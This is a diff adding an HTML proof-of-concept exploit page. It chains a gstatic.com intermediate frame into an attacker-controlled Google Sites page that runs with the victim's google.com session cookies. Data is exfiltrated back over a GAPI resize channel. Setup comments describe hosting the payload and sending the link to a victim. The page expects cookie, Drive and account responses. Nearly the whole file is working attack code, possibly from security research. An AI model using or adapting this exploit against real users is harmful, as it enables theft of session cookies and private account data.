@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<!--
+  Full attack chain: attacker page → intermediate frame → inner frame → sites.google.com/attacker-page
+  The attacker-page runs with VICTIM'S .google.com session cookies.
+  Exfil via resize channel (no origin check in gstatic.com intermediate frame).
+
+  Setup:
+  1. Create a Google Sites page (free, any account)
+  2. Add an "Embed" widget with the content of exfil-sitegoogle-payload.html
+  3. Publish the Sites page
+  4. Set TARGET_SITES_URL below to that page's URL
+  5. Serve this file from any origin and send link to victim
+-->
+<html>
+<head><title>GAPI proxy — credentialed requests via victim session</title></head>
+<body>
+<h3>Victim-authenticated request proxy via updateInnerFrame + resize exfil</h3>
+<pre id="log" style="font-size:11px;height:850px;overflow-y:auto;background:#111;color:#0f0;padding:10px;white-space:pre-wrap"></pre>
+
+<script src="https://apis.google.com/js/api.js"></script>
+<script>
+var logEl = document.getElementById('log');
+var OUR_ORIGIN = window.location.origin;
+
+// =====================================================================
+// ATTACKER: set this to YOUR sites.google.com page that hosts the payload
+// Example: 'https://sites.google.com/view/attacker-exfil-page'
+// =====================================================================
+var TARGET_SITES_URL = 'https://sites.google.com/view/validbyaccident/accueil';
+
+function log(msg) {
+  console.log('[POC] ' + msg);
+  logEl.textContent += '\n[' + new Date().toISOString().slice(11,19) + '] ' + msg;
+  logEl.scrollTop = logEl.scrollHeight;
+}
+
+window.addEventListener('message', function(e) {
+  if (typeof e.data === 'object' && e.data && e.data.magic === 'SHIC' &&
+      e.origin !== 'https://www.gstatic.com') {
+    // direct postMessage from inner frame (before relay) — ignore
+  }
+}, true);
+
+gapi.load('gapi.rpc', function() {
+  log('GAPI loaded');
+  log('Target: ' + TARGET_SITES_URL);
+  log('');
+
+  // Receive exfil — the gstatic intermediate frame relays resize events here via GAPI
+  gapi.rpc.register('resize', function(height) {
+    log('[!!! EXFIL !!!]');
+    try {
+      var data = JSON.parse(height);
+      // Pretty-print multi-line if it's a response body
+      Object.keys(data).forEach(function(k) {
+        log('  ' + k + ': ' + String(data[k]).slice(0, 500));
+      });
+    } catch(e) {
+      log('  raw: ' + String(height).slice(0, 500));
+    }
+    log('');
+  });
+
+  gapi.rpc.register('gapiInitialized', function() {
+    log('Intermediate frame ready');
+  });
+
+  gapi.rpc.register('innerFrameLoaded', function() {
+    log('Inner frame loaded — ' + TARGET_SITES_URL + ' running with VICTIM cookies');
+  });
+
+  var iframe = document.createElement('iframe');
+  iframe.id = 'intermediateFrame';
+  iframe.name = 'intermediateFrame';
+  iframe.src = 'https://www.gstatic.com/atari/embeds/05acf2f48052137958a41565358fb972/intermediate-frame-minified.html' +
+    '?jsh=m%3B%2F_%2Fscs%2Fabc-static%2F_%2Fjs%2Fk%3Dgapi.lb.en.ch0Jz-JlMrQ.O' +
+    '%2Fd%3D1%2Frs%3DAHpOoo_YD4KoV8fTh_kLhktsiThAm3yJ5A%2Fm%3D__features__' +
+    '&r=1' +
+    '&parent=' + encodeURIComponent(OUR_ORIGIN);
+  iframe.style.cssText = 'width:100%;height:250px;border:2px solid magenta';
+
+  iframe.onload = function() {
+    log('Intermediate frame HTML loaded. Waiting 4s for GAPI...');
+    setTimeout(function() {
+      log('Calling updateInnerFrame(' + TARGET_SITES_URL + ')...');
+      gapi.rpc.call('intermediateFrame', 'updateInnerFrame', null, TARGET_SITES_URL, true, false);
+      log('Called. Watching for exfil via resize channel...');
+      log('');
+      log('If TARGET_SITES_URL is a sites.google.com page with exfil-sitegoogle-payload.html,');
+      log('expect: cookie, listSites, GetUserSites, drive, accounts responses below.');
+    }, 4000);
+  };
+
+  document.body.appendChild(iframe);
+  log('Chain: attacker.com → gstatic.com (no origin check) → ' + TARGET_SITES_URL);
+  log('');
+  log('IMPORTANT: sandbox on the inner frame has allow-same-origin.');
+  log('So sites.google.com page loaded there HAS victim.google.com cookies.');
+  log('Exfil comes back via resize GAPI relay (no origin check on gstatic.com).');
+});
+</script>
+</body>
+</html>
